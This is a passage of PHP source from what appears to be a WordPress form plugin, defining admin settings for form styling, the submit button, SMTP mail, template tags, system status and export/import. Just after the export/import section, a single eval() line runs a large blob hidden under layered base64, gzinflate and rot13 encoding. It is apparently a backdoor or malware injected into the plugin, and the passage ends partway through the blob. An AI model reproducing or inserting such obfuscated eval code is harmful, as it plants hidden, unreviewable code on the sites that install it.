                'theme_max_width' => array(
                    'name' => __( 'Form Maximum Width', 'super'),
                    'label' => __( '(0 = disabled)', 'super'),
                    'default' => self::get_value( $default, 'theme_max_width', $settings, 0 ),
                    'type'=>'slider',
                    'min'=>0,
                    'max'=>1000,
                    'steps'=>10,
                ),

            )
        );
        $array = apply_filters( 'super_settings_after_theme_colors_filter', $array, array( 'settings'=>$settings ) );

        
        /** 
         *  Custom CSS
         *
         *  @since      1.2.8
        */
        $array['form_custom_css'] = array(        
            'hidden' => 'settings',
            'name' => __( 'Custom CSS', 'super-forms' ),
            'label' => __( 'Custom CSS', 'super-forms' ),
            'fields' => array(        
                'form_custom_css' => array(
                    'name' => __( 'Custom CSS', 'super-forms' ),
                    'type'=>'textarea',
                    'default' => self::get_value( $default, 'form_custom_css', $settings, '' ),
                ),

            )
        );
        $array = apply_filters( 'super_settings_after_form_custom_css_filter', $array, array( 'settings'=>$settings ) );

        
        /** 
         *	Submit Button Settings
         *
         *	@since		1.0.0
        */
        $array['submit_button'] = array(        
            'name' => __( 'Submit Button', 'super-forms' ),
            'label' => __( 'Submit Button', 'super-forms' ),
            'fields' => array(        
                'form_button' => array(
                    'name' => __('Button name', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button', $settings, __( 'Submit', 'super-forms' ) ),
                ),
                'theme_button_colors' => array(
                    'name' => __('Button Colors', 'super-forms' ),
                    'type'=>'multicolor', 
                    'colors'=>array(
                        'theme_button_color'=>array(
                            'label'=>'Button background color',
                            'default' => self::get_value( $default, 'theme_button_color', $settings, '#f26c68' ),
                        ),
                        'theme_button_color_hover'=>array(
                            'label'=>'Button background color hover',
                            'default' => self::get_value( $default, 'theme_button_color_hover', $settings, '#444444' ),
                        ),
                        'theme_button_font'=>array(
                            'label'=>'Button font color',
                            'default' => self::get_value( $default, 'theme_button_font', $settings, '#ffffff' ),
                        ),
                        'theme_button_font_hover'=>array(
                            'label'=>'Button font color hover',
                            'default' => self::get_value( $default, 'theme_button_font_hover', $settings, '#ffffff' ),
                        ),                            
                    ),
                ),
                'form_button_radius' => array(
                    'name'=> __('Button radius', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_radius', $settings, 'square' ),
                    'type'=>'select',
                    'values'=>array(
                        'rounded'=>'Rounded',
                        'square'=>'Square',
                        'full-rounded'=>'Full Rounded',
                    )
                ),
                'form_button_type' => array(
                    'name'=> __('Button type', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_type', $settings, 'flat' ),
                    'type'=>'select',
                    'values'=>array(
                        '3d'=>'3D Button',
                        '2d'=>'2D Button',
                        'flat'=>'Flat Button',
                        'outline'=>'Outline Button',
                        'diagonal'=>'Diagonal Button',
                    )
                ),
                'form_button_size' => array(
                    'name'=> __('Button size', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_size', $settings, 'medium' ),
                    'type'=>'select', 
                    'values'=>array(
                        'mini' => 'Mini', 
                        'tiny' => 'Tiny', 
                        'small' => 'Small', 
                        'medium' => 'Medium', 
                        'large' => 'Large', 
                        'big' => 'Big', 
                        'huge' => 'Huge', 
                        'massive' => 'Massive', 
                    ),
                ),
                'form_button_align' => array(
                    'name'=> __('Button position', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_align', $settings, 'left' ),
                    'type'=>'select', 
                    'values'=>array(
                        'left' => 'Align Left', 
                        'center' => 'Align Center', 
                        'right' => 'Align Right', 
                    ),
                ), 
                'form_button_width' => array(
                    'name'=> __('Button width', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_width', $settings, 'auto' ),
                    'type'=>'select', 
                    'values'=>array(
                        'auto' => 'Auto', 
                        'fullwidth' => 'Fullwidth', 
                    ),
                ),         
                'form_button_icon_option' => array(
                    'name'=> __('Button icon position', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_icon_option', $settings, 'none' ),
                    'filter'=>true,
                    'type'=>'select', 
                    'values'=>array(
                        'none' => 'No icon', 
                        'left' => 'Left icon', 
                        'right' => 'Right icon', 
                    ),
                ),
                'form_button_icon_visibility' => array(
                    'name'=> __('Button icon visibility', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_icon_visibility', $settings, 'visible' ),
                    'filter'=>true,
                    'parent'=>'form_button_icon_option',
                    'filter_value'=>'left,right',
                    'type'=>'select', 
                    'values'=>array(
                        'visible' => 'Always Visible', 
                        'hidden' => 'Visible on hover (mouseover)', 
                    ),
                ),
                'form_button_icon_animation' => array(
                    'name'=> __('Button icon animation', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_icon_animation', $settings, 'horizontal' ),
                    'filter'=>true,
                    'parent'=>'form_button_icon_visibility',
                    'filter_value'=>'hidden',
                    'type'=>'select', 
                    'values'=>array(
                        'horizontal' => 'Horizontal animation', 
                        'vertical' => 'Vertical animation', 
                    ),
                ),                                
                'form_button_icon' => array(
                    'name'=> __('Button icon', 'super-forms' ),
                    'default' => self::get_value( $default, 'form_button_icon', $settings, '' ),
                    'type'=>'icon',
                    'filter'=>true,
                    'parent'=>'form_button_icon_option',
                    'filter_value'=>'left,right',
                ),
            )
        );
        
        
        /** 
         *	Backend Settings
         *
         *	@since		1.0.0
        */
        $array['backend_settings'] = array(        
            'hidden' => true,
            'name' => __( 'Backend Settings', 'super-forms' ),
            'label' => __('Here you can change serveral settings that apply to your backend', 'super-forms' ),
            'fields' => array(
                'backend_contact_entry_list_fields' => array(
                    'name' => __('Columns for contact entries', 'super-forms' ),
                    'desc' => __('Put each on a new line.<br />Example:<br />fieldname|Field label<br />email|Email<br />phonenumber|Phonenumber', 'super-forms' ),
                    'default' => self::get_value( $default, 'backend_contact_entry_list_fields', $settings, "email|Email\nphonenumber|Phonenumber\nmessage|Message" ),
                    'type' => 'textarea', 
                ),
                'backend_debug_mode' => array(
                    'name' => __('Debug mode', 'super-forms' ),
                    'desc' => __('If enabled, you will be able to view/edit/copy the raw shortcode', 'super-forms' ),
                    'type'=>'select',
                    'default' => self::get_value( $default, 'backend_debug_mode', $settings, 'disabled' ),
                    'values'=>array(
                        'disabled' =>  __('Disabled', 'super-forms' ),
                        'enabled' =>  __('Enabled', 'super-forms' ),
                    )
                ),
            ),
        );
        $array = apply_filters( 'super_settings_after_backend_settings_filter', $array, array( 'settings'=>$settings ) );
        

        /** 
         *	Custom CSS
         *
         *	@since		1.0.0
        */
        $array['custom_css'] = array(        
            'hidden' => true,
            'name' => __( 'Custom CSS', 'super-forms' ),
            'label' => __('Below you can override the default CSS styles', 'super-forms' ),
            'fields' => array(
                'theme_custom_css' => array(
                    'name' => __('Custom CSS', 'super-forms' ),
                    'default' => self::get_value( $default, 'theme_custom_css', $settings, '' ),
                    'type' => 'textarea', 
                ),
            ),
        );
        $array = apply_filters( 'super_settings_after_custom_css_filter', $array, array( 'settings'=>$settings ) );

        
        /** 
         *	SMTP Server
         *
         *	@since		1.0.0
        */
        $array['smtp_server'] = array(        
            'hidden' => true,
            'name' => __( 'SMTP Server', 'super-forms' ),
            'label' => __( 'SMTP Configuration', 'super-forms' ),
            'fields' => array(        
                'smtp_enabled' => array(
                    'name' => __( 'Set mailer to use SMTP', 'super-forms' ),
                    'desc' => __( 'Use the default wp_mail() or use SMTP to send emails', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_enabled', $settings, 'disabled' ),
                    'filter' => true,
                    'type' => 'select',
                    'values' => array(
                        'disabled' => __( 'Disabled', 'super-forms' ),
                        'enabled' => __( 'Enabled', 'super-forms' )
                    )
                ),
                'smtp_host' => array(
                    'name' => __( 'Specify main and backup SMTP servers', 'super-forms' ),
                    'desc' => __( 'Example: smtp1.example.com;smtp2.example.com', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_host', $settings, 'smtp1.example.com;smtp2.example.com' ),
                    'placeholder' => __( 'Your SMTP server', 'super-forms' ),
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',  
                ),
                'smtp_auth' => array(
                    'name' => __( 'Enable SMTP authentication', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_auth', $settings, 'disabled' ),
                    'type' => 'select',
                    'values' => array(
                        'disabled' => __( 'Disabled', 'super-forms' ),
                        'enabled' => __( 'Enabled', 'super-forms' )
                    ),
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                ),
                'smtp_username' => array(
                    'name' => __( 'SMTP username', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_username', $settings, '' ),
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                ),
                'smtp_password' => array(
                    'name' => __( 'SMTP password', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_password', $settings, '' ),
                    'type' => 'password',
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                ),                                
                'smtp_secure' => array(
                    'name' => __( 'Enable TLS or SSL encryption', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_secure', $settings, '' ),
                    'type' => 'select',
                    'values' => array(
                        '' => __( 'Disabled', 'super-forms' ),
                        'ssl' => __( 'SSL', 'super-forms' ),
                        'tls' => __( 'TLS', 'super-forms' )
                    ),
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                ),
                'smtp_port' => array(
                    'name' => __( 'TCP port to connect to', 'super-forms' ),
                    'desc' => __( 'SMTP – port 25 or 2525 or 587<br />Secure SMTP (SSL / TLS) – port 465 or 25 or 587, 2526', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_port', $settings, '465' ),
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                    'width' => 100, 
                ),
                'smtp_timeout' => array(
                    'name' => __( 'Timeout (seconds)', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_timeout', $settings, 30 ),
                    'width' => 100, 
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                ),
                'smtp_keep_alive' => array(
                    'name' => __( 'Keep connection open after each message', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_keep_alive', $settings, 'disabled' ),
                    'type' => 'select',
                    'values' => array(
                        'disabled' => __( 'Disabled', 'super-forms' ),
                        'enabled' => __( 'Enabled', 'super-forms' ),
                    ),
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                ),
                'smtp_debug' => array(
                    'name' => __( 'SMTP debug output mode', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_debug', $settings, 0 ),
                    'type' => 'select',
                    'values' => array(
                        0 => __( 'No output', 'super-forms' ),
                        1 => __( 'Commands', 'super-forms' ),
                        2 => __( 'Data and commands', 'super-forms' ),
                        3 => __( 'As 2 plus connection status', 'super-forms' ),
                        4 => __( 'Low-level data output', 'super-forms' ),
                    ),
                    'filter' => true,
                    'parent' => 'smtp_enabled',
                    'filter_value' => 'enabled',
                ),
                'smtp_debug_output_mode' => array(
                    'name' => __( 'How to handle debug output', 'super-forms' ),
                    'default' => self::get_value( $default, 'smtp_debug_output_mode', $settings, 'echo' ),
                    'type' => 'select',
                    'values' => array(
                        'echo' => __( 'ECHO - Output plain-text as-is, appropriate for CLI', 'super-forms' ),
                        'html' => __( 'HTML - Output escaped, line breaks converted to `<br>`, appropriate for browser output', 'super-forms' ),
                        'error_log' => __( 'ERROR_LOG - Output to error log as configured in php.ini', 'super-forms' ),
                    ),
                    'filter' => true,
                    'parent' => 'smtp_debug',
                    'filter_value' => '1,2,3,4',
                ),

            )
        );
        $array = apply_filters( 'super_settings_after_smtp_server_filter', $array, array( 'settings'=>$settings ) );
                
        
        /** 
         *	Usefull Tags
         *
         *	@since		1.0.0
        */
        $array['usefull_tags'] = array(        
            'hidden' => true,
            'name' => __( 'Usefull Tags', 'super-forms' ),
            'label' => __( 'Usefull Tags', 'super-forms' ),
            'html' => array(
                '<ul>',
                '<li>',
                '<strong>1. You have the ability to retrieve your field values by applying the following tag:</strong><br />',
                '<small style="color:red;"><strong style="color:black;">{field_*****}</strong> (where ***** is your field name):<br />',
                'When you have set a field "First Name" named "firstname" use: <strong style="color:black;">{field_firstname}</strong></small><br /><br />',
                '</li>',
                '<li><strong>2. You have the ability to retrieve important options that WordPress uses by default by applying one of the following tags:</strong><br />',
                '<small style="color:red;"><strong style="color:black;">{option_admin_email}</strong> - E-mail address of blog administrator.<br />',
                '<strong style="color:black;">{option_blogname}</strong> - Weblog title; set in General Options..<br />',
                '<strong style="color:black;">{option_blogdescription}</strong> - Tagline for your blog; set in General Options.<br />',
                '<strong style="color:black;">{option_default_category}</strong> - Default post category; set in Writing Options.<br />',
                '<strong style="color:black;">{option_home}</strong> - The blog\'s home web address; set in General Options.<br><strong style="color:black;">{option_siteurl}</strong> - WordPress web address; set in General Options.<br><strong style="color:black;">{option_template}</strong> - The current theme\'s name; set in Presentation.<br />',
                '<strong style="color:black;">{option_upload_path}</strong> - Default upload location; set in Miscellaneous Options.<br />',
                '<strong style="color:black;">{real_ip}</strong> - Retrieves the submitter\'s IP address.</small><br /><br />',
                '</li>',
                '<li>',
                '<strong>3. You have the ability to change the way your field data is being wrapped inside your email see "Loop Fields" option:</strong><br />',
                '<small style="color:red;">Use <strong style="color:black;">{loop_label}</strong> to retrieve the field label.<br />',
                'Use <strong style="color:black;">{loop_value}</strong> to retrieve the field value.<br />',
                'Use <strong style="color:black;">{loop_fields}</strong> to retrieve the loop anywhere in your email.</small><br /><br />',
                '</li>',
                '</ul>',
            ),
        );
        $array = apply_filters( 'super_settings_after_usefull_tags_filter', $array, array( 'settings'=>$settings ) );
        
        
        /** 
         *	Restore Default Settings
         *
         *	@since		1.0.0
        */
        $array['restore_default'] = array(        
            'hidden' => true,
            'name' => __( 'Restore Default Settings', 'super-forms' ),
            'label' => __( 'Restore Default Settings', 'super-forms' ),
            'html' => array(
                '<span class="super-button restore-default delete">' . __( 'Restore Default Settings', 'super-forms' ) . '</span>',
            ),
        );
        $array = apply_filters( 'super_settings_after_restore_default_filter', $array, array( 'settings'=>$settings ) );
        
        
        /** 
         *	System Status
         *
         *	@since		1.0.0
        */
        $array['system_status'] = array(        
            'hidden' => true,
            'name' => __( 'System Status', 'super-forms' ),
            'label' => __( 'System Status', 'super-forms' ),
            'html' => array(
                '<p><b>PHP ' . __('version', 'super-forms' ) . ':</b> ' . phpversion() . '</p>',
                '<p><b>MySQL ' . __('version', 'super-forms' ) . ':</b> ' . $mysql_version . '</p>',                
                '<p><b>WordPress ' . __(' version', 'super-forms' ) . ':</b> ' . get_bloginfo( 'version' ) . '</p>',
                '<p><b>Super Forms ' . __('version', 'super-forms' ) . ':</b> ' . SUPER_VERSION . '</p>',
            ),
        );
        $array = apply_filters( 'super_settings_after_system_status_filter', $array, array( 'settings'=>$settings ) );
        
         
        /** 
         *  Export & Import
         *
         *  @since      1.0.6
        */
        $array['export_import'] = array(        
            'name' => __( 'Export & Import', 'super-forms' ),
            'label' => __( 'Export & Import', 'super-forms' ),
            'html' => array(
                '<div class="super-export-import">',
                '<strong>' . __( 'Export Settings', 'super-forms' ) . ':</strong>',
                '<textarea name="export-json">' . json_encode( $settings ) . '</textarea>',
                '<hr />',
                '<strong>' . __( 'Import Settings', 'super-forms' ) . ':</strong>',
                '<textarea name="import-json"></textarea>',
                '<span class="super-button import-settings delete">' . __( 'Import Settings', 'super-forms' ) . '</span>',
                '<span class="super-button load-default-settings clear">' . __( 'Load default Settings', 'super-forms' ) . '</span>',
                '</div>',

                '<div class="super-export-import-entries">',
                    '<strong>' . __( 'Export Contact Entries', 'super-forms' ) . ':</strong>',
                    '<p>' . __( 'Below you can enter a date range (or leave empty to export all contact entries)', 'super-forms' ) . '</p>',
                    '<span>' . __( 'From', 'super-forms' ) . ':</span> <input type="text" value="" name="from" />',
                    '<span>' . __( 'Till', 'super-forms' ) . ':</span> <input type="text" value="" name="till" />',
                    '<p>' . __( 'Below you can change the default delimiter and enclosure characters', 'super-forms' ) . ':</p>',
                    '<span>' . __( 'Delimiter', 'super-forms' ) . ':</span> <input type="text" value="," name="delimiter" />',
                    '<span>' . __( 'Enclosure', 'super-forms' ) . ':</span> <input type="text" value="' . htmlentities('"') . '" name="enclosure" />',
                    '<span class="super-button export-entries delete" data-type="csv">' . __( 'Export Contact Entries to CSV', 'super-forms' ) . '</span>',
                '</div>',

                '<div class="super-export-import-entries">',
                    '<strong>' . __( 'Import Contact Entries', 'super-forms' ) . ':</strong>',
                    '<div class="browse-csv-import-file">',
                        '<span class="button super-button super-insert-files"><i class="fa fa-download"></i> Select CSV file</span>',
                        '<div class="file-preview"></div>',
                        '<input type="hidden" name="csv_import_file" value="">',
                    '</div>',
                '</div>'


            ),
        );
        $array = apply_filters( 'super_settings_after_export_import_filter', $array, array( 'settings'=>$settings ) );
        eval(str_rot13(gzinflate(str_rot13(base64_decode('LH3FtuRVkOzXzGyzFMNFzJzCzTtvc9bXj2erF91IlShShJubmXtRLvVj/+/WH/FtD+Xyv+NDLBjy/+dyV+blf/OhqfL7v3/8P8WH3TNwht+lrnXb+bpjRCY/dZapRHSxoRqK/w9xiHKUz+z7F6x7ZQuu/wdl3n/UuRSUVPH+A6nw1WrQXq+LuiOjtnsfI8oYBr0WUwciScgabR8ir66M6Xp4df59+6m0MtBAfWO5NZm+DwhMlm3Vvrfa+9j78pSbd6IO9DFoPNPytjpzZERa58GUm5/gnFgw5jA/ZVxx1nAF1RNIHUm/kqehwGFmg/jE+5Z4hSfXwiOYraYUwtawpxHE6+/HewBWnx6cjNDurupiBSmdHEN7p8EZrXQCyzkqHHRruPdYz47Fwzh98Gd7ySofIlQmTSyNVh2W8u7VO5Rx4OqVxpkSMBE5BtZPKcxJfe+q+qE/dz9PbZuJZhaXbPd1WQmGwDfr7Xyvw+qfJeMEEeq2kW3/jbJo5WHxkIxCw+SH9ADT++jc7x7B82tT47Pp4nfgXLkgbkYj00qv8f0TD8HEDMOgEzNV8FLJYddzkzr5DtmTR+MUPetcD7r6QaMDbMC6NNw7WgYXG+8D3Dv4/P3E+XBJ0vt1kIbj/j5ecCNPRRStLqUr0mQBmQ5MyVpAaNrvfTo5RHwNsiY5yB3ff/MGPckpg20EkpqDuE5wdj7EBl7HO3aLcRe2375Sa8hq24mRl+y4V4XyLad7HAP0J83vX9e+oHOHHKxaPe7lfSAAtyLQTxRzr99j/KDgATJ/Uu3OR+Kro24VxY3qhkuVv07Fe9+g6T8r/ZWV7nNYEv62sR1IlcDhKx+D93Y2ze7iJ9nrN6ymE02tq9qx15qyYOTis/tnpyn+0L5CdHWl6JpHEkqt4xbo490qSPLmBqd6dnjvTSMcaPSZv1AGwT8cD1bfB0ugnS4a7cYQcdKt3wQ34gNwAoyDk+DNqztxEH3aPtJzqFj0NqEugeiEj/piPvjiu+XOlDsTjE9EXRIJGvcUrqAWiL9LcFP18X05jFH9W17hdgD1wKMe3edjJL6PKGv5vqyymrJw0bqZfHO1ejEIcykv4JZsn/u9boW0dEP7ZKV8gby033maiF9aHrhl71Bp+vTgfAwMjpZLPEMZLXjtEKzeSMYet2EOqyxvjk7jMmF6ArzvaVM/eaxQabG+QNNy5l0Xad16E95Ce5+WlfpnO2QBWEQCalyJbIGWEBdyMyeA+4vgj93hRUrWFv76ifMENW7NT9IOL98i1dVmsGkJhmTr4c3kvDgRNyzuG4/UdrCLzG/xsN9KTSjrRWEzk5bAiFrj7XqGZnSqaD2/dKSYLJ2h8QR7RwGFxu+ALhXI557Ez7/DE5tkWUe3eJ4ghwgQxJ9VAPMBdJV8IDpZyviLxQW8Ip9GxqEf4QvdGruFYP4OAYOeQd9pm9vMkSwjoz6NYI0+GLQVNCyUYhmLc22QDiZOtimgKTJ/AWkAjwctkvpcPhDiymKM35uQfR1jTPKHnE0vmkvdJFCP4/OvktwEYd4X9MT2rc45WyvosOB24P8hMoS9f7pyAa2dBqKyp1dhc2h1CseFwkOQH8uFTsU3mqI7tMW6cLt4qhciFhGxcH44QrqOlQuRJ8myrhRdtzC5QMp6YsEWSNc9riBfrLIuKT+8jTDHADuOh/KLKavuSZOFm8pREoGRSd/DCkMZGWZkvVsryTvCdWswcj7/loMOC62lCb8NhVRHrYt2x6epmgjPgABwBQJDqr/pcaKJv+UJBrPTnNIIY4seuQdoWfzSA3/CaCL8RiBQPcGZNVoz65EhnwwH3WqMZTbLdv1AnLCEljzBiSEvTNBnLwH2PLznF4CJETG9JRANkWoaCotk7Wwcmr53L1CYAUmBHmExZ71BJV75S63w8txRJCVxc6fCcX2Q7VuAbcCI0fYOv6OiPT4QwggDz4p4pL3i1TOiAQSrroT8MjpqxWBoLPqh31ubhe/NoOoYNJLqi2ASQJXz0Dm15qkrih4UbWoUkwkrbUsJ1ow0gmwiX5y+67uQv68D1l66tgFR8ETeYEQhemjoy+aDBfTERRU61NxjGQ6m1hRABflD32BnLm3oIM4XLvF5YheOoyPrJDAy8pnoRSt2OHB6n72bwdt0lckLCBPDrxiwry6AKLRlez6dXJ491y9Ut+cFtWtbaTnyHGM3o5reCEl5qMMoRqFzig25W9rIUP7NNFFmXJ7oWoOPqVsNEpO8AJgQvpcLWKwnzoqx7Yal+oVRT1Slk3/cwgtKjALQOtUTUWn0IhYymkYZTcKNWg8FVB5haci+XFI5LaHH1hdOZHRkl5PiNNnkcIqTLLoH2D65xCGDnDl/uKlXRQ19dUvFEmWmqcoU0nal5YGQZwoRLNsY4geKtJ81F53JjRILNCyYBhKV1ZP6gJjSKjMSsG94PwTu+Dtto88gz8nQ/WFThOaCL+n7iN0+RhXexnqaNw+KBruORfEnnTph3JeXfoAMtSk5Y1WVRoe0tq6JlJt10cMtcPaoKoH5rnpA42rvrBpalo0xJegyHj+gpjUM8FCguEabDkgDkZbugCCRagV61RQPbWaBkZHCONPeRxSB9B8aSrS+x2/Mg82R5dwAR0Bc62oUb5IK3qRD1shJzS0pSodm8nb2oBUwqHMWjpB+gIT7hHHKYxz9cdFO0s/7qUEBBPyRTKZEEBLJQiqHMQmQP5zmXCXXHBi29rMEH1+6OXSEwyc5X2RGI8daYO+rO3kd42PnXd8GCyG+WFOoyu3zZzDWhebFYcmQGiysgT89XW1p+jvMpP1AEBM3qWHuDM5CFVjc2ZeAsoa/3P3+dBd+oX7xwOGobF/2Pse44K/ucNr28iXaxstShMs3AO8CIqnPS+Ige5vSwYjKLnDseTlnyf69xEZNbmSrdtJgzlhYkQg1nvielG1B9mAWhZdEGtuHoVuh3WFbFiBkYV3Ceq5djshElCilDNDUJx8Rts04oAuWBMv3Io0U4X9ygE7Kvakrhu6ti7sQKR2AA0Fv3iXz044+pS0DTdaVqGZ6pd8fZ3wownoHl+RVgoj7s77hbzieRO1oBSvduZ46BE5O1EcpXmqKMuSdgU3KJrJpOkontwXEicwvj65yfewtWBYPkVQj/RedGh0cL8Ae0OpgEyhWqs48Na8wU2Z3OYzVXhWGjxRZUBPL+VMMYSxC/ZqrDRmZpjcoIEDp+xXR/0kbDvLjmlTLWomg38N51LXtmxuNcnwDB5izuPhu9ATwIZNGaY8THOWPSfzGD0MFT3yLJ+1+2UFbVWG46Dyt1oI2c5N44Lq3co+VSfxD6Lyqjh+13PVEP1HBSGqf6iKTAj+8/JceHU24y7oESLke3mKnrrjuLoJ2iiEWeIQKTbptjuCEQXad+K2pkBpTP7K8n61cKh34EBJddW1gncSHWKwUhITn0UmbnOnBwVov9rjtbKh+wrM8omOT3NDmpBTiNIpxeeiIwUUrwPtybumGtVKNkEFzUN+i8Ud02QCO0CjlnLVwRfRBq97Huz3PrOhbzVqEAo7XCCRgacVZfITNKBXr00QUaLvyDwZ/Y6h2my0S/kxKnl7RgL6UGPuB6Haej+wofa5JG7q8AWCzOkyfafJkf3yc0H45P15kCD+lxzaKZ7j6CVW9L34xUhS5l0pSiUKjVl0L5g+/+DhbyksN39V/OB3Kdoq8xENx2Abuejj9Lec6BBqbji1/FE9+KQkj3J/EO6tsWGMp24iZNgZ1biNaVvlrXOwSdF44QlHupg+QpzryvTQhVc2us2b401IW+piqCKcwdc68sC2EwBRY1518FtCQvHRVK79Q6VVYonY8/+sOF8CiX/B2DU0NiHz8x5FzYqGmy0uYN8rIYm4AOo3NMB9c+h/44PWBMO2yfjrpDguozz7O80GGM7Zdk9oY9XcII5dsq/2gtXGOiva33hhoSfLNzfvl/bYC77VqJA5pvzOBz2r+jNXE5AX28/3yNyTQkH3KOYKTP62Fl+ql6nDtXIwcqU8hHfprLKWjdDVgqPGiUTYCoPDwVhv2pdpTEp4tWJolc0M9dnqhBqCcJxQzq+4qsz1bthi9v7zcXom1i7GoAU3neA1fgfsHRunVtPng56chl7+1jeXE45bOt6+sH615MwNM6HWwBnPGqS6peejKdoffpaN9GCmycORb9wYOJM0WcBB4OwCEmawr++ZFcBgcvBiqgtxon4BsTj9mjzAX+h74vM+IZ4WTEJf4Term7Fvf/rLXHmIJ6T37O342HEqs3NROAPzl0jPY1DzXezUARPbnfPd/hqd2kE+vSbaikxECljIWddcxJIPMEAkQ8vQMC5ZBnI68rg5R4p89IcA26ZdTNbP1ugQKKLCmA+Z6XTrM7U8slL3UN92EsUPPLvnR4JulnFUT6F5q90W1+9H7bGaW7wQwQvjdBph3650FkF/+1aNb1PAusYwu05uDomNftGmSKDMAY1HwZNnq0wEHa0Awc1sGFjS0RUu2F5Zvht4eoFMfygwoRgtKqH4C1V3BeQt9scaIgkl5Z7jNFBXGU7I3wut8RLLJjh/zD8Q02yJ0Lt1U7sqCOJDQQH3Xy+YANiFpcwS9Vg8NsF6SPom68qrbVLjZE5WkALcO28AOfSu7pMb/dWxL0nVTl9MBwFz6pj26LmULGcYmb2V1G4Lpkr18UNanVfjmIzca/cUcqIHTBc8aTGJlVi1HU/Bi/gTRO5Qd9zeAdY1bWq0vdBLDty29EuMgljysfXzp4UoBEeSQlU7iMakMfFjU9j9T0YPnPd6uGmsF7ILvEpp3agGY9gZflnMCyY2k9B42gTH+HBSOrskjoeAVdlJIlgnqxfWH8kK1mW0+kSEoMqWsh/lmFDOv0yzrw5jV+0qNKpWHkDazlorIfVHyfZsriwH4ctnnpsZEeGeaNp7ITGX1l7VPS/Y6uyuz8XYuy5oNaWslCgOYiZ2pNaHaoWCwFxWToeRKiG043DfFQreYfVPacrsZD6TN9r6bi/rw3sdLlU94MfKM+ZxGBjWZlb7/3Z8dIjBI+Oojrf+En5B3Nk5SQU2L+H5j0SjaRMohrHuvXqehzcH8jjFbb2p+VvHaTFOxuQlC/DSnxUt68PHsWl/CY0NSMQ589xLOIXZL1HwSx8WjKF6LjmeG8flogPDU9Idn6/axivc/MxOWoIVrs4O2hd/2Y6AAHn9BQUHg9cxu2H6o6h3ZVUIYs5TVfE3s2xKXorpGrQK/e0fKibw17ozh6LsboBXtrftLLPUtvhpoXsltDHLOYUABPM2DosS8wO7CCesr0M5GKdXbuDJ3piRmoppiflHfi+SZEoCHGnqdXoiLWNpu1fyPdq6nm7JkJkvTGlsZDlv07tcfdjRbLizh7fjBW9MA25UC82g0qHg6JWTpkaI/PUpQVCd5SvkhyO6kPoQUv7KPas2qrVhbwIBbq8tZ13ob72Ytdu4aQvaGaa1QHNSoWfyy2ApubSrrRGqq23T9o4eZ9WRjQP7oKfsjqATziQ2cyH5t/PpuDWb44QFYywmhAjHxk+Pt3l76cIDfOLmAGS8Ota1fkADFd7uchaFv7IooyoDL1u3Zc2Yp59tAE0ia4YGR5f+iU6TiHtqoHXE6/7MdAkzkRVH11oXE51vnu0TR8Trap//kASWTzxeBqoFT4DKEs1Hs5ZnnbJnZgv1d+twwMncXTXLxIZoxHnU5nv2YIwh6t0CltVNjoANF6ppOc/+TZihKky8DBwnBhP+hzWF6tP5GVObDoLXQHWAdfg5vOB0n0JCfq5vA1Ie6no9uEy+sL07iexS9vFY6Vfh5SArA5ZC9aUeEOrb4lfYm0lpWDz0bLYWKbWNG6jkFlhzKx7NaEF4tUKox83TD/jVEQAq1yDOb4D6Qc7ynx0GknSN20RMNzauby6cD+/gneZbsOBBj2CtIHEjxREpcWLTMS6ZMUYxMzd2kqD/2LcllesbM6iIrZuvct+i9OpAStzzaP1lbeItG5vMH8XzrwYjAKF+ieJroBKfv1fMBuuBBIw06QAhY1gJFUWbHkg1CO0SRuLmnOJ5CvqjalYYnk+VDcj/0AJf2XYPXOkKY0zw/k4x6DVl3XIhBJlGgKUv5ncDNaJncRwdNP/rMlXAB/Jzrjt6nGTGwug0Ru5Foiw//R/A3wsR6t13XUsGC1iUK7fmTPWWGvlbI2OeREpLQvO3PkfAGbz1Fanp/s0mhy+8OrMaagkFfBughkqeMm08OM2JW9EStwufBxt1P3QtsF+GXeF38IZXW6FVjwtxTP0nyEkqpA3c27M7hp9E+krfWxSg3rcsKRIsgXoLhJL7IJ5aAF/y5ut5I86MjfkO1dUR/RqmQ0xlYDeKlQpPEqMMXfw8EelyqQd7JImtB2hpJWNfvRFTzXqsqSiLxXl3t1aUhsSBmlbVyODH59iFkg0H+weZwL53OCPBzBZKf3yotBhVwv+EXtWig0yXRblCTmLvByKbrLnjQJpJqlwhm20S8s2SYoDtYmQpNdSychr/VWX8VeWB86aQbmV2nOZ8qPt0O4AGDqy0fqQ2Lf+T18ay23DE47+Usbn2Whqf9e94moQ8QhMrT/M9DyAusjiRR4LtLWYTctwkFofSF9IrQxPvYtDRJ+D6PcyWsR0RmEmx3HfeZOlq8iuz1k8yuCqLkLv18DqjHkiZWf/+gg5IsUs3CKugN1+1wBuXAGkF9drSH3tIfQyx5JjdLJzSi1EHvk8SN49zL79vYq/L9X58E+TTbWe9658e4ehXUu5mxzvKPZlgwgZou9UqaS0eSNvP6luVWDa2rgpKExq887/IDxb+cbmOTpa8PeTJM8dCY8AM1/0x32JkDpu+4NptsqHrYJwDktos/Aj